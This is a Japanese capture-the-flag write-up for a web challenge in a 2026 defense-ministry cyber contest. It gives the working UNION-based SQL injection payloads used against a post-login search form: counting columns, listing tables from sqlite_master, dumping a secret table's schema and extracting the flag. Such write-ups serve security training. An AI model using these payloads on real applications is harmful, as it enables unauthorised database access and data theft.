---
title: '会員限定の裏口 - 防衛省サイバーコンテスト2026'
description: '防衛省サイバーコンテスト2026のWriteupです。'
pubDate: 2026-02-02
category: 'CTF'
tags: ['MODCC', 'Writeup', 'Web', 'injection']
---

# 会員限定の裏口
> ログイン画面にSQLiはなく、ログイン後の検索画面にSQLiが存在しそこを調査していく

> カラム数列挙、8以降はエラー  
UNION baseのSQLinjectionが可能
```sql
'order by 7 --
```
> テーブルの列挙
```sql
' UNION SELECT sql, null, null, null, null, null, null FROM sqlite_master WHERE type='table' --
admin_secret
logs
sqlite_sequence
users
```
> スキーマの列挙
```sql
' UNION SELECT sql, null, null, null, null, null, null FROM sqlite_master WHERE name='admin_secret' --
CREATE TABLE admin_secret ( id INTEGER PRIMARY KEY AUTOINCREMENT, admin_name TEXT NOT NULL, secret_key TEXT NOT NULL, flag TEXT NOT NULL, created_at DATETIME DEFAULT CURRENT_TIMESTAMP, access_level INTEGER DEFAULT 5, encryption_type TEXT DEFAULT "AES256", backup_location TEXT DEFAULT "/secure/backup", last_modified DATETIME DEFAULT CURRENT_TIMESTAMP, classification TEXT DEFAULT "TOP_SECRET" )
```
```sql
' UNION SELECT flag, null, null, null, null, null, null FROM admin_secret --
```